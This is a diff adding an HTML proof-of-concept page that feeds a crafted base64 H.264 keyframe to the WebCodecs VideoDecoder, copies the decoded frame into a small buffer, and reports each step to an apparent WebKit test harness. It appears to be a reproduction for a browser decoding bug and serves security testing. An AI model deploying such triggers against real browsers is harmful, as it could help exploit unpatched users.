@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head><title>dfe0d84a7b PoC</title></head>
+<body>
+<script>
+const H264_B64 = "AAAAAWdCwB7Gna0AAAABaM44gAAAAAFliIQAM/////g=";
+function b64ToUint8(b64) {
+    const bin = atob(b64);
+    const arr = new Uint8Array(bin.length);
+    for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+    return arr;
+}
+function post(msg) {
+    console.log('[PoC] ' + msg);
+    try { window.webkit.messageHandlers.status.postMessage(msg); } catch(e) {}
+}
+async function run() {
+    post('START');
+    if (typeof VideoDecoder === 'undefined') {
+        post('FAIL:NoWebCodecs'); return;
+    }
+    const decoder = new VideoDecoder({
+        output: (frame) => {
+            post('DECODED:w=' + frame.visibleRect.width + ' h=' + frame.visibleRect.height);
+            const dest = new Uint8Array(512);
+            frame.copyTo(dest).then(() => {
+                frame.close();
+                post('COPYTO:OK');
+            }).catch(err => {
+                frame.close();
+                post('COPYTO_ERR:' + err.message);
+            });
+        },
+        error: (err) => { post('DECODE_ERR:' + err.message); }
+    });
+    try {
+        await decoder.configure({
+            codec: 'avc1.42001E',
+            codedWidth: 16,
+            codedHeight: 16
+        });
+        decoder.decode(new EncodedVideoChunk({
+            type: 'key', timestamp: 0,
+            data: b64ToUint8(H264_B64)
+        }));
+        await decoder.flush();
+        post('FLUSH_DONE');
+    } catch(e) { post('ERR:' + e.message); }
+    setTimeout(() => post('DONE'), 3000);
+}
+window.onload = run;
+</script>
+</body>
+</html>
